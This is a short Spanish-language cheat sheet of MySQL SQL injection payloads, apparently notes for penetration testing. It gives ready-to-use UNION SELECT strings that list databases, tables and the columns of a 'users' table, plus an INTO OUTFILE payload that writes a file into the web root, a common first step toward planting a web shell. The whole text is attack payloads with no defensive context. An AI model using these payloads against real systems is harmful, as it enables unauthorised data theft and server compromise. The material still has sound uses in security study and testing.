# SQL Injection

## MySQL

### Listar bbdd

~~~
' union select schema_name,null from information_schema.schemata
~~~

### Listar tablas

~~~
' union select table_name,null from information_schema.tables where table_schema='products'-- -
~~~

### Listar columnas

~~~
' union select column_name,null from information_schema.columns where table_schema='products' and table_name='users'-- -
~~~

### Insertar fichero

~~~
union select 'hola' into outfile '/var/www/html/prueba.txt'-- -
~~~
